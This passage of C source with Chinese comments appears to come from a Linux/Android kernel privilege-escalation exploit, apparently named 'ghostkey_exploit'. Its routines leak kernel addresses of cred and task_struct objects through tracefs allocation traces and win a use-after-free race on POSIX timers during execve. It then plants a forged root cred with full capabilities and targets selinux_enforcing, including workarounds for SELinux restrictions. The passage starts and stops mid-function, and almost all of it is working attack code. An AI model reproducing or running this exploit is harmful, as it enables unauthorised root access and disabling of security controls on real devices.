    STAGE_LOG("等待中 pid=%d", (int)getpid());
    for (;;) {
        unsigned char go;
        char msg[96];
        if (read(g_wake[0], &go, 1) != 1) {
            if (g_daemon_mode) {
                /* 守护形态：setsid + stdio 指向 /dev/null + 永远 pause()。
                 * 这个 task 的 ->cred 指向回填页，它不能再执行任何有意义的
                 * 系统调用（每次页错误都是让内核踩到已释放内存的机会）。 */
                STAGE_LOG("daemon mode：钉住页面");
                log_sync();
                setsid();
                close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO);
                open("/dev/null", O_RDONLY);
                open("/dev/null", O_WRONLY);
                open("/dev/null", O_WRONLY);
                for (;;) pause();
            }
            continue;
        }
        if (go == 0xAA) {
            const char *ack = "daemon\n";
            ssize_t w = write(g_report[1], ack, strlen(ack));
            (void)w;
            close(g_wake[0]); close(g_report[1]);
            g_daemon_mode = 1;
            continue;
        }
        if (go == CRED_CAPSET_CMD) {
            /* 只为让父进程抓到 cred_jar 的分配地址；不改任何权限。 */
            struct cred_cap_hdr hdr = { CAP_VERSION_3, 0 };
            struct cred_cap_data data[2] = { { 0, 0, 0 }, { 0, 0, 0 } };
            long rc = syscall(SYS_capset, &hdr, data);
            int saved = errno;
            char ack[48];
            snprintf(ack, sizeof(ack), "cap rc=%ld errno=%d\n", rc, saved);
            {
                ssize_t w = write(g_report[1], ack, strlen(ack));
                (void)w;
            }
            STAGE_LOG("%s", ack);
            continue;
        }
        snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
                 getuid(), geteuid(), getgid(), getegid());
        {
            ssize_t w = write(g_report[1], msg, strlen(msg));
            (void)w;
        }
        STAGE_LOG("%s", msg);
        /* root 确认后，把 rootd 放到独立进程里：它继承的是 prepare_creds()
         * 复制出来的正规 cred_jar 对象，可以正常 fork/exec/退出。 */
        if (getuid() == 0 && geteuid() == 0 && !g_rootd_forked) {
            pid_t rd = fork();
            if (rd == 0) { setpgid(0, 0); run_rootd(); _exit(0); }
            g_rootd_forked = 1;
            STAGE_LOG("已 fork rootd pid=%d", (int)rd);
        }
    }
}

/* 读子进程 CapEff：区分「残血 root（有 uid 无 cap）」与完整 root */
static uint64_t read_cap_eff(pid_t pid)
{
    char path[64], line[160];
    uint64_t v = 0;
    FILE *f;
    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
    f = fopen(path, "r");
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "CapEff:", 7)) {
            unsigned long long t = 0;
            if (sscanf(line + 7, "%llx", &t) == 1) v = (uint64_t)t;
            break;
        }
    }
    fclose(f);
    return v;
}

/*
 * 让 cred_child 执行一次 capset 并等回执。tracing_on 由调用方控制，
 * 分配必须落在「已开 trace」到「关 trace」之间。
 */
/*
 * --cred-only 没有 stage_c，得自己把 capset 触发子进程拉起来。
 * stage_c 里那套 fork 保持原样：它同时还要用这次 fork 产生的
 * task_struct 分配做 leak_task，两件事不能合并。
 */
static int cred_child_ensure(void)
{
    if (g_cred_child_pid > 0) return 0;
    if (pipe(g_wake) || pipe(g_report)) {
        STAGE_LOG("pipe 失败 errno=%d", errno);
        return -1;
    }
    g_cred_child_pid = fork();
    if (g_cred_child_pid == 0) cred_child();
    if (g_cred_child_pid < 0) {
        STAGE_LOG("fork 失败 errno=%d", errno);
        return -1;
    }
    close(g_wake[0]); g_wake[0] = -1;
    close(g_report[1]); g_report[1] = -1;
    /* 等子进程进 mlockall 和读循环，否则第一次 capset 可能赶在它启动前 */
    {
        struct timespec nap = { .tv_sec = 0, .tv_nsec = 50000000L };
        nanosleep(&nap, NULL);
    }
    return 0;
}

/* 仅探测模式不留常驻进程，取完值就把触发子进程收掉 */
static void cred_child_reap(void)
{
    if (g_cred_child_pid > 0) {
        kill(g_cred_child_pid, SIGKILL);
        (void)waitpid(g_cred_child_pid, NULL, 0);
        g_cred_child_pid = -1;
    }
    if (g_wake[1] >= 0)   { close(g_wake[1]);   g_wake[1] = -1; }
    if (g_wake[0] >= 0)   { close(g_wake[0]);   g_wake[0] = -1; }
    if (g_report[0] >= 0) { close(g_report[0]); g_report[0] = -1; }
    if (g_report[1] >= 0) { close(g_report[1]); g_report[1] = -1; }
}

static int cred_child_capset(void)
{
    unsigned char cmd = CRED_CAPSET_CMD;
    char buf[64];
    struct pollfd pfd;
    ssize_t n;
    if (g_wake[1] < 0 || g_report[0] < 0) return -1;
    fcntl(g_report[0], F_SETFL, O_NONBLOCK);
    while (read(g_report[0], buf, sizeof(buf)) > 0) ;
    fcntl(g_report[0], F_SETFL, 0);
    if (write(g_wake[1], &cmd, 1) != 1) return -1;
    pfd.fd = g_report[0]; pfd.events = POLLIN;
    if (poll(&pfd, 1, 3000) <= 0) { STAGE_LOG("capset 无应答"); return -1; }
    n = read(g_report[0], buf, sizeof(buf) - 1);
    if (n <= 0) return -1;
    buf[n] = 0;
    STAGE_LOG("%s", buf);
    return 0;
}

/*
 * 从 cpu0 的文本 trace 里挑出 cred 分配。
 * 首选 call_site 打印成 prepare_creds+0x.. 的行（最准）；退而求其次
 * 按 bytes_req == sizeof(struct cred) 匹配（capset 期间分配很少）。
 */
/* 回读 kmem_cache_alloc 的 enable 状态；trigger 间接启用时是 "1*"。 */
static int kmem_event_enabled(void)
{
    char v[8] = "";
    int fd = open(TRACE "/events/kmem/kmem_cache_alloc/enable",
                  O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    if (read(fd, v, sizeof(v) - 1) <= 0) { close(fd); return 0; }
    close(fd);
    return v[0] == '1';
}

/*
 * 用 tracefs filter 把 kmem_cache_alloc 限制在 cred_child 一个 pid 上。
 *
 * raw 记录是紧凑二进制，逐字节扫描没有可靠的记录边界，读不到
 * trace_entry.pid；而文本 trace 的 ptr 被 %p 哈希成 32 位 ID，取不到 KVA。
 * 两条路都走不通时，唯一干净的办法是让内核在写 ring 之前就丢掉别人的分配。
 *
 * 这一步直接决定 --cred-only 的结果：画像 cred_link 只要和真机 build 的
 * prepare_creds() 不在同一条指令上，by_site 就恒为 0，只能退到
 * bytes_req == cred_size 的弱匹配；而 176 字节的 slab 不止 cred 一家，
 * 弱匹配会把噪声地址当成 cred 交出去。
 */
static int kmem_pid_filter(pid_t pid)
{
    char rule[48];
    int rc;
    g_kmem_filter_ok = 0;
    if (pid <= 0) return -1;
    snprintf(rule, sizeof(rule), "common_pid == %d\n", (int)pid);
    rc = write_file(TRACE "/events/kmem/kmem_cache_alloc/filter", rule);
    if (!rc) g_kmem_filter_ok = 1;
    return rc;
}

static void kmem_pid_filter_clear(void)
{
    write_file(TRACE "/events/kmem/kmem_cache_alloc/filter", "0\n");
    g_kmem_filter_ok = 0;
}

/*
 * 从 cpu0 的二进制 raw trace 取 cred 分配的真实地址。
 *
 * 文本 trace 里的 ptr 会被内核的 %p 哈希成 32 位 ID（真机日志里是
 * ptr=000000009a5111d0），拿不到 KVA；raw 流里存的是原始 8 字节，
 * collect_nth 取 k_itimer 地址走的就是这条路。
 *
 * entry 布局（与 collect_nth 一致）：
 *   +0 call_site, +8 ptr, +16 bytes_req, +24 bytes_alloc
 * 注意 cred 的 bytes_req=176 而 bytes_alloc=192，两者不等，所以这里
 * 必须用 +16；collect_nth 用 +24 是因为 k_itimer 的 264/264 相同。
 *
 * 优先 call_site == slide(cred_link)，退路 bytes_req == cred_size。
 */
/*
 * raw 记录里的 call_site 一定是内核 .text 的地址（slide 后与 timer_link
 * 同段）。逐字节扫描时用它做「记录边界」校验：只有真落在 call_site
 * 字段上的 i 才可能通过，偶然撞上 bytes_req==176 的偏移会被排掉。
 */
static int kernel_text_like(uint64_t v)
{
    uint64_t ref = slide_addr(P.timer_link);
    return (v >> 32) == (ref >> 32) && (v & 3) == 0;
}

static int collect_cred_ptr_raw(uint64_t *out)
{
    uint8_t *buf = raw_buf(8U << 20);
    uint64_t site = slide_addr(P.cred_link);
    size_t used = 0, i;
    int fd, by_site = 0, by_pid = 0, by_any = 0;
    uint64_t pick = 0, pick_site = 0, pick_pid = 0, pick_any = 0;
    uint32_t want_pid;

    *out = 0;
    if (!buf) return -1;
    fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
              O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
        STAGE_LOG("打不开 trace_pipe_raw errno=%d (%s)", errno, strerror(errno));
        return -1;
    }
    while (used + 4096 < (8U << 20)) {
        ssize_t got = read(fd, buf + used, (8U << 20) - used);
        if (got <= 0) break;
        used += (size_t)got;
    }
    close(fd);
    /* trace_entry.pid 就在 call_site 前 4 字节。SELinux 常把
     * events/.../filter 设成不可写（EACCES），内核不肯替我们过滤；但 raw
     * 每条记录自带 pid，只要 i 真落在 call_site 上，i-4 就是分配者。
     * cred_child 在窗口内只做一次 capset，pid 一锁就不会再抓到别人
     * 176 字节的 slab。 */
    want_pid = (uint32_t)g_cred_child_pid;
    for (i = 4; i + 40 <= used; i++) {
        uint64_t ptr, req, cs;
        uint32_t pid;
        int hit_site;

        memcpy(&cs, buf + i, 8);
        hit_site = (site && cs == site);
        if (!hit_site && !kernel_text_like(cs)) continue;
        memcpy(&req, buf + i + 16, 8);
        if (!hit_site && req != P.cred_size) continue;
        memcpy(&ptr, buf + i + 8, 8);
        if ((ptr >> 48) != 0xffff || (ptr & 7)) continue;
        memcpy(&pid, buf + i - 4, 4);
        if (hit_site)          { by_site++; pick_site = ptr; }
        else if (pid == want_pid) { by_pid++;  pick_pid = ptr; }
        else                   { by_any++;  pick_any = ptr; }
    }
    pick = pick_site ? pick_site : (pick_pid ? pick_pid : pick_any);
    STAGE_LOG("raw=%zu by_site=%d(needle=%#" PRIx64 ") by_pid=%d by_any=%d"
              " filter=%d pick=%#" PRIx64, used, by_site, site, by_pid,
              by_any, g_kmem_filter_ok, pick);
    if (!pick) return -1;
    *out = pick;
    return 0;
}

static uint64_t collect_cred_ptr(void)
{
    static const char *paths[] = {
        TRACE "/per_cpu/cpu0/trace",
        TRACE "/trace",
    };
    uint64_t strong = 0, link = 0, weak = 0;
    int pi;

    for (pi = 0; pi < 2; pi++) {
        char line[1024];
        FILE *file;
        unsigned long total = 0, kmem = 0, withptr = 0;
        int shown = 0, shown_other = 0;

        file = fopen(paths[pi], "r");
        if (!file) {
            STAGE_LOG("打不开 %s errno=%d (%s)", paths[pi], errno,
                      strerror(errno));
            continue;
        }
        while (fgets(line, sizeof(line), file)) {
            const char *p, *q;
            uint64_t ptr, site;
            unsigned long req;

            total++;
            if (!strstr(line, "kmem_cache_alloc")) {
                if (!shown_other && strstr(line, "cred")) {
                    shown_other = 1;
                    line[strcspn(line, "\r\n")] = 0;
                    STAGE_LOG("样本(非kmem,含cred)=%.160s", line);
                }
                continue;
            }
            kmem++;
            if (shown < 3) {
                line[strcspn(line, "\r\n")] = 0;
                STAGE_LOG("样本=%.200s", line);
                shown++;
            }
            p = strstr(line, "ptr=0x");
            if (!p) continue;
            ptr = strtoull(p + 6, NULL, 16);
            withptr++;
            if ((ptr >> 48) != 0xffff || (ptr & 7)) continue;
            if (strstr(line, "prepare_creds")) { strong = ptr; continue; }
            q = strstr(line, "call_site=0x");
            if (q) {
                site = strtoull(q + 10, NULL, 16);
                if (site == P.cred_link) link = ptr;
            }
            q = strstr(line, "bytes_req=");
            if (!q) continue;
            req = strtoul(q + 10, NULL, 10);
            if (req == P.cred_size) weak = ptr;
        }
        fclose(file);
        STAGE_LOG("%s 行=%lu kmem=%lu 带ptr=%lu | sym=%#" PRIx64
                  " link(%#" PRIx64 ")=%#" PRIx64 " size(%u)=%#" PRIx64,
                  pi ? "trace" : "cpu0", total, kmem, withptr, strong,
                  P.cred_link, link, P.cred_size, weak);
        /* cpu0 有记录就停；空则回退全局，区分"没记录"与"落到别的核"。 */
        if (kmem > 0) break;
    }
    return strong ? strong : (link ? link : weak);
}

static int leak_cred_addr(uint64_t *out)
{
    uint64_t ptr = 0;

    *out = 0;
    write_file(TRACE "/tracing_on", "0\n");
    if (write_file_mode(TRACE "/trace", "", O_TRUNC))
        STAGE_LOG("清空 trace 失败 errno=%d", errno);
    /* 64KB 只够几百条，RPC 往返期间 cpu0 的分配有上千条，会被环覆盖。 */
    if (write_file(TRACE "/buffer_size_kb", "16384\n"))
        STAGE_LOG("buffer_size_kb 不可写 errno=%d（沿用默认）", errno);

    /* 先上 pid filter 再 arm。filter 一条都不命中时事件照样能开，
     * 只是 raw 变空，不会像 enable 那样卡在 soft-disabled。
     * Android 的 SELinux 常把 filter 设成不可写（EACCES），这不是错误：
     * collect_cred_ptr_raw() 会退到记录内的 trace_entry.pid 做同样的事。 */
    if (kmem_pid_filter(g_cred_child_pid))
        LOG_V1("[cred] filter 不可写 errno=%d，改用记录内 pid 过滤", errno);
    else
        LOG_V1("[cred] kmem_cache_alloc filter=common_pid==%d",
               (int)g_cred_child_pid);

    if (arm_kmem_cache_alloc()) goto out;
    if (!kmem_event_enabled()) {
        STAGE_LOG("kmem_cache_alloc 回读仍未启用，放弃本轮");
        disarm_kmem_cache_alloc();
        goto out;
    }
    if (write_file(TRACE "/tracing_on", "1\n")) {
        STAGE_LOG("tracing_on 打不开 errno=%d", errno);
        disarm_kmem_cache_alloc();
        goto out;
    }
    if (cred_child_capset()) {
        write_file(TRACE "/tracing_on", "0\n");
        disarm_kmem_cache_alloc();
        goto out;
    }
    write_file(TRACE "/tracing_on", "0\n");
    if (collect_cred_ptr_raw(&ptr))
        ptr = 0;
    disarm_kmem_cache_alloc();
    write_file(TRACE "/buffer_size_kb", "7\n");
    kmem_pid_filter_clear();
    if (!ptr) {
        /* raw 没取到：再扫一遍文本 trace，把符号名和哈希 ptr 打出来定位 */
        (void)collect_cred_ptr();
        STAGE_LOG("raw 与文本都没有可用的 cred 分配");
        return -1;
    }
    *out = ptr;
    return 0;

out:
    kmem_pid_filter_clear();
    return -1;
}

static int task_size_in_window(uint64_t v)
{
    if (!P.task_struct_size) return 0;
    return v >= P.task_struct_size &&
           v <= (uint64_t)P.task_struct_size + TASK_VENDOR_EXTRA_MAX;
}

static int stage_c_leak_task(void)
{
    uint8_t *buf = raw_buf(4U << 20);
    uint64_t want_site = P.task_alloc_link ? slide_addr(P.task_alloc_link) : 0;
    int hits = 0, by_site = 0, by_size = 0, have_site = 0;
    size_t total_raw = 0, n_scan = 0;
    size_t n_drop_addr = 0, n_drop_size = 0, n_drop_pid = 0, n_drop_match = 0;
    if (!buf) return -1;

    if (pipe(g_wake) || pipe(g_report)) return -1;

    /* 对齐校准 A/B 的启用仪式。在「直接写 enable 被拒、必须走 rss_stat
     * trigger 回退」的 ROM 上，enable_event 规则要等 rss_stat 命中才真正把
     * 事件打开；A/B 靠成批量活动持续触发，而旧版这里只有一次 fork，事件
     * 往往还没启用就关了 tracing，raw 全空 -> hits=0。另外校准 B 结束时
     * disarm_all() 把 buffer_size_kb 压到 7，不恢复的话 fork 期间的记录
     * 会被瞬间挤掉。 */
    disarm_all();
    write_file(TRACE "/buffer_size_kb", "16384\n");
    if (arm_kmem_cache_alloc()) return -1;
    write_file(TRACE "/events/kmem/rss_stat/enable", "1\n");
    for (int i = 0; i < 32; i++) kick_rss();
    /* 轻量预热：确认 slab 事件已真正启用；随后清空噪声，只留 fork 的记录 */
    timer_probe(64, 0);
    write_file_mode(TRACE "/trace", "", O_TRUNC);
    if (trace_off_on()) return -1;

    /* 这次 fork 同时干两件事：制造一次 task_struct slab 分配供 trace 捕获，
     * 并留下常驻的 cred_child 作为后续伪造 cred 的持有者。 */
    g_cred_child_pid = fork();
    if (g_cred_child_pid == 0) cred_child();
    if (g_cred_child_pid < 0) return -1;
    close(g_wake[0]); close(g_report[1]);
    g_wake[0] = g_report[1] = -1;
    /* 给 cred_child 进入 mlockall/日志、以及 fork 内 slab 记录落进 ring
     * buffer 留出时间，避免父进程过早关 tracing 把唯一一条记录截断。 */
    {
        struct timespec nap = { .tv_sec = 0, .tv_nsec = 30000000L };
        nanosleep(&nap, NULL);
    }
    write_file(TRACE "/tracing_on", "0\n");

    for (int cpu = 0; cpu < cpu_count(); cpu++) {
        size_t used = capture_raw_cpu(cpu, buf, 4U << 20);
        total_raw += used;
        LOG_V1("[task] cpu%d raw=%zu 字节", cpu, used);
        for (size_t i = 8; i + 40 <= used; i++) {
            uint64_t site = rd_u64(buf + i);
            uint64_t ptr  = rd_u64(buf + i + 8);
            uint64_t req  = rd_u64(buf + i + 16);
            uint64_t alloc= rd_u64(buf + i + 24);
            uint32_t owner;
            int match;
            n_scan++;
            if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
                { n_drop_addr++; continue; }
            if (req < 8 || req > (1U << 22)) { n_drop_size++; continue; }
            memcpy(&owner, buf + i - 4, 4);          /* trace_entry.pid */
            if ((pid_t)owner != getpid()) { n_drop_pid++; continue; }
            /* 判据 1（确定性）：call_site == copy_process 分配点 */
            if (want_site && site == want_site) { match = 1; by_site++; }
            /* 判据 2（兜底）：bytes_req/alloc 落在 task_struct 尺寸窗口内 */
            else if (task_size_in_window(req) ||
                     (task_size_in_window(alloc) && !(alloc & 63))) { match = 2; by_size++; }
            else { n_drop_match++; continue; }
            if (match == 1) { g_task = ptr; have_site = 1; }
            else if (!have_site) g_task = ptr;
            hits++;
        }
    }
    disarm_kmem_cache_alloc();
    write_file(TRACE "/tracing_on", "0\n");
    LOG_V1("[task] raw 合计=%zu 扫描=%zu 丢弃(地址=%zu/尺寸=%zu/pid=%zu/判据=%zu)"
           " want_site=%#" PRIx64 " 窗口=%#" PRIx64 "..%#" PRIx64,
           total_raw, n_scan, n_drop_addr, n_drop_size, n_drop_pid, n_drop_match,
           want_site, (uint64_t)P.task_struct_size,
           (uint64_t)P.task_struct_size + TASK_VENDOR_EXTRA_MAX);
    STAGE_LOG("hits=%d by_site=%d by_size=%d task=%#" PRIx64,
              hits, by_site, by_size, g_task);
    return hits ? 0 : -1;
}

/* ==========================================================================
 * [4] UAF 竞态窗口（漏洞核心）
 * 原项目：uaf_plant.c:prepare_vmas / spawn_helper / locker_fn / killer_fn /
 *         exec_fn / child_race / wait_phase / wait_exec_hold
 *
 * 四个角色：
 *   locker ×3 : 对 50000 个 VMA 反复 mprotect(PROT_NONE<->PROT_READ)，
 *               让 execve 的 mmap 拆除路径变慢，撑开竞态窗口；
 *   killer    : 轮询 tgkill(tgid, exec_tid, 0) 直到 exec 线程消失(ESRCH)，
 *               随即 tgkill(tgid, tgid, SIGKILL) 把整个线程组打死；
 *   exec_fn   : 造 2048 个 timer（第 1024 个 armed，1 小时后到期），
 *               等 locker 进入 mprotect 后 execve("/proc/self/exe")；
 *   main.c 顶部的 --exec-ok 快退分支必须存在，否则子进程会重跑整个利用，
 *               毁掉这个窗口。
 * ========================================================================== */
#define NVMA 50000
#define HELPER_STACK (1 << 20)

static _Atomic int g_go, g_stop, g_lockers, g_in_mprotect, g_exec_tid, g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc { atomic_int phase; atomic_int will_exec; int helpers[4]; int nhelpers; };
static struct ipc *ipc;

static int prepare_vmas(void)
{
    long page = 4096;
#ifdef SYS_memfd_create
    int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
#else
    int fd = -1;
#endif
    void *base;
    if (fd < 0 || ftruncate(fd, page)) return -1;
    g_vmalen = (size_t)NVMA * (size_t)page;
    base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) return -1;
    for (int i = 0; i < NVMA; i++) {
        void *at = (char *)base + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
            return -1;
    }
    close(fd);
    g_vmas = base;
    return 0;
}
static int spawn_helper(int (*fn)(void *), void *arg)
{
    void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if (stack == MAP_FAILED) return -1;
    return clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
}
static int locker_fn(void *arg)
{
    int prot = PROT_NONE;
    (void)arg;
    while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
        if (atomic_load_explicit(&g_stop, memory_order_acquire)) return 0;
        sched_yield();
    }
    atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
    while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
        int rc;
        atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
        rc = mprotect(g_vmas, g_vmalen, prot);
        atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
        if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1,
                                           memory_order_relaxed) == 0)
            STAGE_LOG("mprotect 失败 errno=%d", errno);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    return 0;
}
static int killer_fn(void *arg)
{
    int tgid = (int)(intptr_t)arg, old;
    while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
        if (atomic_load_explicit(&g_stop, memory_order_acquire)) return 0;
        sched_yield();
    }
    for (;;) {
        if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH) break;
        if (atomic_load_explicit(&g_stop, memory_order_acquire)) return 0;
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    STAGE_LOG("已发 SIGKILL tgid=%d 旧 tid=%d", tgid, old);
    return 0;
}
static void *exec_fn(void *arg)
{
    struct sigevent ev, armed_ev;
    struct itimerspec spec;
    timer_t armed;
    int made = 0;
    char *argv[] = { (char *)"ghostkey_exploit", (char *)"--exec-hold", NULL };
    (void)arg;
    memset(&ev, 0, sizeof(ev));            ev.sigev_notify = SIGEV_NONE;
    memset(&armed_ev, 0, sizeof(armed_ev)); armed_ev.sigev_notify = SIGEV_SIGNAL;
    armed_ev.sigev_signo = SIGRTMIN;
    memset(&spec, 0, sizeof(spec));        spec.it_value.tv_sec = 3600;

    if (pin_cpu(0)) _exit(116);
    while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
        if (atomic_load_explicit(&g_stop, memory_order_acquire)) _exit(124);
        sched_yield();
    }
    for (int i = 0; i < 2048; i++) {
        timer_t id;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID,
                         i == 1024 ? &armed_ev : &ev, &id)) _exit(120);
        if (i == 1024) {
            armed = id;
            if (timer_settime(armed, 0, &spec, NULL)) _exit(120);
        }
        made++;
    }
    if (made < 2048) _exit(120);
    atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
    atomic_store_explicit(&ipc->phase, 3, memory_order_release);
    while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
        if (atomic_load_explicit(&g_stop, memory_order_acquire)) _exit(125);
        sched_yield();
    }
    atomic_store_explicit(&g_go, 1, memory_order_release);
    while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
        if (atomic_load_explicit(&g_stop, memory_order_acquire)) _exit(123);
        sched_yield();
    }
    /* 触发点：execve 释放本线程组的 POSIX timer，armed timer 仍在到期路径上。
     * begin_new_exec() -> exit_itimers() 会走 posix_cpu_timer_del()，写原语
     * 在那里落地；此后本 task 必须常驻，退出即遍历脏树 oops。 */
    atomic_store_explicit(&ipc->will_exec, 1, memory_order_release);
    execve("/proc/self/exe", argv, NULL);
    _exit(122);
}
static int child_race(void)
{
    pthread_t exec_thread;
    sigset_t block;
    int tgid = (int)getpid();
    sigemptyset(&block);
    sigaddset(&block, SIGRTMIN);
    sigprocmask(SIG_BLOCK, &block, NULL);
    if (prepare_vmas()) _exit(110);
    if (pin_cpu(1)) _exit(115);
    for (int i = 0; i < 3; i++) {
        int pid = spawn_helper(locker_fn, NULL);
        if (pid < 0) _exit(111);
        ipc->helpers[ipc->nhelpers++] = pid;
    }
    {
        int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
        if (pid < 0) _exit(112);
        ipc->helpers[ipc->nhelpers++] = pid;
    }
    if (pthread_create(&exec_thread, NULL, exec_fn, NULL)) _exit(114);
    atomic_store_explicit(&ipc->phase, 1, memory_order_release);
    for (;;) pause();
}
static int wait_phase(int want)
{
    for (int i = 0; i < 600; i++) {
        struct timespec nap = { .tv_nsec = 50000000 };
        if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want) return 0;
        nanosleep(&nap, NULL);
    }
    return -1;
}
static void stop_helpers(void)
{
    if (!ipc) return;
    for (int i = 0; i < ipc->nhelpers && i < 4; i++)
        if (ipc->helpers[i] > 0) kill(ipc->helpers[i], SIGKILL);
}
/* 等待 race child 完成 execve 并进入 --exec-hold 的 SIGSTOP 常驻态。
 *
 * 写原语（__rb_erase_augmented 的 left-child 分支）把 signal 的
 * posix_cputimers timerqueue 根改成了 &task->cred 或页内假节点。这个 task
 * 一旦退出，release_task -> __exit_signal -> posix_cpu_timers_exit[_group]
 * 就会顺着脏指针遍历红黑树，必然 oops（PANIC_ON_OOPS 下直接 panic）。
 * 只要它不退出，group_dead 永不成立，清理路径就永远不执行。
 * 状态 T 出现在 /proc/<pid>/stat 即表示 execve 已返回（写原语发生在
 * execve 内部，此时必然已完成）。 */
static int wait_exec_hold(pid_t child)
{
    char path[64], buf[512];

    snprintf(path, sizeof(path), "/proc/%d/stat", (int)child);
    for (int i = 0; i < 400; i++) {
        struct timespec nap = { .tv_nsec = 10000000 };
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0) {
                char *p;
                buf[n] = 0;
                p = strrchr(buf, ')');
                if (p && p[1] == ' ' && (p[2] == 'T' || p[2] == 't'))
                    return 0;
            }
        }
        nanosleep(&nap, NULL);
    }
    return -1;
}

/* [4a] 取第 1024 个 k_itimer 作为 victim
 * 原项目：uaf_plant.c:collect_nth —— 以 slide_addr(timer_link) 为 needle
 * 扫 raw buffer，过滤 req==0x108 且 ptr 是 8 字节对齐的内核地址。 */
static int collect_nth(int index, int *count, uint64_t *chosen)
{
    uint8_t *buf = raw_buf(8U << 20);
    uint8_t needle[8];
    uint64_t site = slide_addr(P.timer_link);
    size_t used;
    int n = 0;
    if (!buf) return -1;
    memcpy(needle, &site, 8);
    *chosen = 0;
    used = capture_raw_all(buf, 8U << 20);
    for (size_t i = 0; i + 32 <= used; i++) {
        uint64_t ptr, req;
        if (memcmp(buf + i, needle, 8)) continue;
        memcpy(&ptr, buf + i + 8, 8);
        memcpy(&req, buf + i + 24, 8);
        if (req != P.kitimer_size || (ptr >> 48) != 0xffff || (ptr & 7)) continue;
        if (n == index) *chosen = ptr;
        n++;
    }
    *count = n;
    STAGE_LOG("captured=%d chosen=%#" PRIx64 " raw=%zu", n, *chosen, used);
    return (n > index && *chosen) ? 0 : -1;
}

/* ==========================================================================
 * [5] 回填模式（8KB 一页）
 * 原项目：uaf_plant.c:build_stream_pattern / open_stream_pairs / reclaim_stream
 *
 * 两种形态：
 *  g_plant_cred=0：以 24 字节步长铺满伪造的 rb/timerqueue 节点
 *      {0, 0, target}。node[2] 即被内核悬挂的「指针域」，target 就是这次
 *      写原语要落到的内核地址（selinux_enforcing - 7）。
 *  g_plant_cred=1：在 node_off 处摆一份完整的伪造 struct cred ——
 *      uid/gid/euid=0、五个 capability 全 1、security 指向页内 blob、
 *      user/user_ns/ucounts/groups 指回真实内核全局对象，usage 非 0 防提前释放。
 *      6.6 布局额外在 cred[2] 写 g_task + task_cred 作为写原语目标；
 *      5.15/6.1 因 euid@20 只能写 4 字节 usage，其余字段靠整页清零。
 * ========================================================================== */
static int build_stream_pattern(unsigned char *pat, unsigned node_off,
                                uint64_t base, uint64_t target, uint64_t victim)
{
    if (g_plant_cred) {
        uint64_t page = P.page_offset + (base << 12);
        uint64_t node_kva = victim + P.kitimer_node;
        unsigned cred_off = node_off + CRED_SHIFT;
        unsigned blob = 0xffffffffu;
        uint64_t cred_kva;
        uint64_t *cred;
        if (cred_off + P.cred_size > 8192) {
            /* overflow past the page: place the cred below the node */
            if (node_off < CRED_SHIFT + 24) {
                STAGE_LOG("植入数据放不下 off=%#x", node_off);
                return -1;
            }
            cred_off = node_off - CRED_SHIFT;
        }
        if (cred_off + P.cred_size > 8192 ||
            page + node_off != node_kva) {
            STAGE_LOG("植入数据放不下 off=%#x", node_off);
            return -1;
        }
        cred_kva = page + cred_off;
        /* a 32-byte blob (cred->security payload) that collides with neither
         * the rb_node nor the forged cred */
        for (unsigned k = 0; k < 2; k++) {
            unsigned c = k ? 0x1f00u : 0u;
            if (c + 32 > 8192)
                continue;
            if (!(c + 32 <= node_off || node_off + 24 <= c))
                continue;
            if (!(c + 32 <= cred_off || cred_off + P.cred_size <= c))
                continue;
            blob = c;
            break;
        }
        if (blob == 0xffffffffu) {
            STAGE_LOG("找不到 blob 空位 off=%#x cred=%#x", node_off, cred_off);
            return -1;
        }
        /*
         * Re-arm the write primitive while keeping every rb_node pointer
         * inside this page.
         *
         * __rb_erase_augmented() takes the "left child only" branch when
         * rb_right == 0 and rb_left != 0:
         *
         *     tmp = node->rb_left;              // &task->cred
         *     tmp->__rb_parent_color = pc = node->__rb_parent_color;
         *     parent = __rb_parent(pc);         // cred_kva, in this page
         *     __rb_change_child(node, tmp, parent, root);
         *     rebalance = NULL;                 // no colour fixup
         *
         * The second line is the primitive: *(task->cred) = pc.  So pc must
         * be cred_kva and __rb_parent(pc) must stay inside the page, which
         * keeps __rb_change_child() off the bogus 0x0000000XXXXXXXX address
         * that used to abort in rb_next().  It then stores tmp into cred+8
         * (gid/suid on 5.15/6.1, uid/gid on 6.6); the follow-up
         * one_uaf(g_cred_kva + 8) zeroes that slot again.
         */
        {
